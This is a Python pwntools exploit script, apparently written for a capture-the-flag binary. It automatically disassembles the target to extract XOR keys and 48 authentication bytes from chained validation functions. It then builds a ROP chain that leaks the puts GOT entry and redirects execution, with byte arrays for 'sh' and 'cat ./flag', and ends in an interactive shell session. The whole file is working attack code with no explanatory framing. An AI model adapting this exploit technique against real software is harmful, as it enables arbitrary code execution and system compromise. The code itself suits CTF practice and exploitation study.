#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./binaries/bin1
from pwn import *
import re

# Set up pwntools for the correct architecture
exe = context.binary = ELF(sys.argv[1], checksec=False)

dt_fini_address = exe.dynamic_by_tag('DT_FINI').entry.d_ptr
disassembly = exe.disasm(exe.entry, dt_fini_address - exe.entry)
search_start_main_str = 'push rbp; mov rbp, rsp; sub rsp, 0x30;'

for search_address in exe.search(asm(search_start_main_str)):
    main_address = search_address

for search_address in exe.search(asm('leave; ret;')):
    if search_address > main_address:
        end_main_address = search_address
        break

main_disassembly = exe.disasm(main_address, end_main_address - main_address)
xor_values = [int(line.split(' f0 ')[1][:2], 16) for line in main_disassembly.split('\n') if 'xor' in line]

[xor_even, xor_odd] = xor_values

for line in main_disassembly.split('\n'):
    if 'movzx' in line and '#' in line:
        base_buffer_address = int(re.split('# *', line)[1], 16)

function_calls_in_main = [line for line in main_disassembly.split('\n') if 'call' in line]
first_validation_function_address = int(function_calls_in_main[-2].split(' ')[-1], 16)

authentication_values = []
next_validation_function_address = first_validation_function_address


def format_src(param):
    if param == 'al' or param == 'rax':
        return 'eax'
    if param == 'cl' or param == 'rcx':
        return 'ecx'
    if param == 'dil' or param == 'rdi':
        return 'edi'
    if param == 'rdx' or param == 'dl':
        return 'edx'
    return param


def format_dest(state, param):
    if param.startswith('0x'):
        return int(param, 16)
    
    try:
        return int(param)
    except:
        pass

    formatted = format_src(param)

    return state[formatted]

def find_values(start_address, end_address):
    print(hex(start_address), hex(end_address))
    disassembly = exe.disasm(start_address + 0x8, end_address - (start_address + 0x8)).split('\n')

    # cmp_values = [int(line.split(', ')[1], 16) for line in disassembly if 'cmp' in line]
    cmp_values = [0 if 'BYTE' in line.split(', ')[1] else int(line.split(', ')[1], 16) for line in disassembly if 'cmp' in line]

    state = {
            'eax': 0,
            'edi': cmp_values[0],
            'esi': cmp_values[1],
            'edx': cmp_values[2],
            'ecx': 0,
            'BYTE PTR [rbp-0x4]': 0,
            'BYTE PTR [rbp-0x8]': 0,
            'BYTE PTR [rbp-0xc]': 0
    }

    local1 = local2 = local3 = None
    
    for line in disassembly:
        if 'mov' in line:
            after_instruction = re.split('mov\w* *', line)[1]
            param1, param2 = after_instruction.split(', ')
            
            value = format_dest(state, param2)

            state[format_src(param1)] = value
        elif 'cmp' in line:
            after_instruction = re.split('cmp *', line)[1]
            param1 = after_instruction.split(', ')[0]
            value = state[format_src(param1)]
            number_value = value if value <= 0xff else int(hex(value)[-2:], 16)

            if number_value < 0:
                number_value += 0x100
            
            if local1 is None:
                local1 = number_value
                state['BYTE PTR [rbp-0x4]'] = value
            elif local2 is None:
                local2 = number_value
                state['BYTE PTR [rbp-0x8]'] = value
            elif local3 is None:
                local3 = number_value
                return [local1, local2, local3]
        elif 'add' in line:
            after_instruction = re.split('add *', line)[1]
            param1, param2 = after_instruction.split(', ')
    
            value = format_dest(state, param2)

            state[format_src(param1)] += value
        elif 'sub' in line:
            after_instruction = re.split('sub *', line)[1]
            param1, param2 = after_instruction.split(', ')

            value = format_dest(state, param2)

            state[format_src(param1)] -= value

            while state[format_src(param1)] < 0:
                    state[format_src(param1)] += 0x100
        elif 'imul' in line:
            after_instruction = re.split('imul *', line)[1]
            param1, param2 = after_instruction.split(', ')

            value = format_dest(state, param2)

            state[format_src(param1)] *= value
        elif 'shl' in line:
            after_instruction = re.split('shl *', line)[1]
            param1, param2 = after_instruction.split(', ')

            value = format_dest(state, param2)

            state[format_src(param1)] *= (2 ** value)
        elif 'lea' in line:
            after_instruction = re.split('lea *', line)[1]
            param1, param2 = after_instruction.split(', ')
            
            first, second, last = re.split('[*+]', param2[1:-1])

            value = (format_dest(state, first) * format_dest(state, second) + format_dest(state, last)) if param2.index('+') > param2.index('*') else (format_dest(state, first) + format_dest(state, second) * format_dest(state, last))

            state[format_src(param1)] = value
 
        elif 'jn' in line:
            continue
        else:
            print('unsupported command ', line)


for i in range(16):
    for line in exe.disasm(next_validation_function_address, 1000).split('\n'):
        if 'ret' in line:
            end_validation_function_address = int(line.split(':')[0][1:], 16)
            break
    
    validation_values = find_values(next_validation_function_address, end_validation_function_address)
    authentication_values.extend(validation_values)

    for line in exe.disasm(next_validation_function_address, end_validation_function_address - next_validation_function_address).split('\n'):
        if 'call' in line:   
            next_validation_function_address = int(re.split('call *', line)[1], 16)
            break

win_address = next_validation_function_address

for search_address in exe.search(asm('ret;')):
    if search_address > win_address:
        end_win_address = search_address
        break

win_buffer_size = 0
for line in exe.disasm(win_address, end_win_address - win_address).split('\n'):
    if 'sub    rsp' in line:
        win_buffer_size = int(line.split(', ')[1], 16)
        break


def int_to_list(num):
    hex_str = hex(num)[2:]
    hex_str = hex_str.rjust(16, '0')
    l = []

    for i in range(len(hex_str) - 2, -1, -2):
        l.append(int(hex_str[i:i+2], 16))

    return l


rop = ROP(exe)

pop_rdi_ret_gadget = int_to_list(rop.find_gadget(['pop rdi', 'ret']).address)
pop_rsi_pop_r15_gadget = int_to_list(rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address)
ret_gadget = int_to_list(rop.find_gadget(['ret']).address)


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

ld = ELF('./libs/ld-linux-x86-64.so.2')
libc = ELF('./libs/libc.so.6')
print(next(libc.search(b'/bin/sh\x00')))
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([ld.path, exe.path] + argv, gdbscript=gdbscript, *a, **kw, env={"LD_PRELOAD":libc.path})
    else:
        return process([ld.path, exe.path] + argv, *a, **kw, env={"LD_PRELOAD":libc.path})

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = f'''
hbreak *0x60001f9
hbreak *0x6000200
hbreak *{hex(main_address)}
hbreak *{hex(next_validation_function_address)}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

SYSTEM_PUTS_OFFSET = 0x30170 # taken from the appropriate libc (locally currently)

# base_buffer_address = 0x02684720 FOUND

# xor_even = 0x1c FOUND
# xor_odd = 0xa6 FOUND

#authentication_values = [0xca, 0x20, 0xa1, 0x1, 0xe4, 0x94, 0x62, 0x25, 0x29, 0xaa, 0x2e, 0x90, 0x9, 0x82, 0x4b, 0xf1, 0x15, 0x38, 0xf8, 0xc9, 0x7d, 0xdf, 0xff, 0x80, 0x1, 0xc6, 0x9f, 0xd5, 0xe1, 0xe1, 0xdd, 0x12, 0xcd, 0xa6, 0x62, 0xf0, 0xfd, 0x1a, 0xeb, 0xbc, 0x5, 0x2f, 0x1a, 0x6d, 0x80, 0x20, 0x8e, 0x37] FOUND!!!


def encode_payload(payload):
    values = authentication_values + payload

    encoded_payload = ''

    for index, value in enumerate(values):
        encoded_value = value
 
        if index % 2 == 0:
            encoded_value ^= xor_even
        else:
            encoded_value ^= xor_odd
 
        encoded_payload += str(hex(encoded_value))[2:].rjust(2, '0')

    return encoded_payload


padding = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
puts_got_offset = int_to_list(exe.symbols['got.puts'])
srand_got_offset = int_to_list(exe.symbols['got.srand'])
puts_plt_address = int_to_list(exe.symbols['plt.puts'])
memcpy_plt_address = int_to_list(exe.symbols['plt.memcpy'])
main_address = [0xb0, 0x2c, 0x48, 0x02, 0x00, 0x00, 0x00, 0x00]
sh = [0x73, 0x68, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
ls = [0x6c, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
cat_flag_1 = [0x63, 0x61, 0x74, 0x20, 0x2e, 0x2f, 0x66, 0x6c]
cat_flag_2 = [0x61, 0x67, 0x00, 0x00, 0x00, 0x0, 0x00, 0x00]
sh_address = int_to_list(base_buffer_address + 0x30 + 69 * 8 + 8)

additional_buffer_padding = ret_gadget * (win_buffer_size // 8)

sh_address = int_to_list(base_buffer_address + 0x30 + ((win_buffer_size // 8) * 8) + 60 * 8 + 8)
payload = additional_buffer_padding + 50 * ret_gadget + pop_rdi_ret_gadget + puts_got_offset + pop_rsi_pop_r15_gadget + srand_got_offset + int_to_list(0) + puts_plt_address + memcpy_plt_address

values = authentication_values + payload

input = ''

for index, value in enumerate(values):
    encoded_value = value

    if index % 2 == 0:
        encoded_value ^= xor_even
    else:
        encoded_value ^= xor_odd
    
    input += str(hex(encoded_value))[2:].rjust(2, '0')

print(exe.symbols)

io = start([bytes(input, 'utf-8')])

io.recvline()

io.interactive()

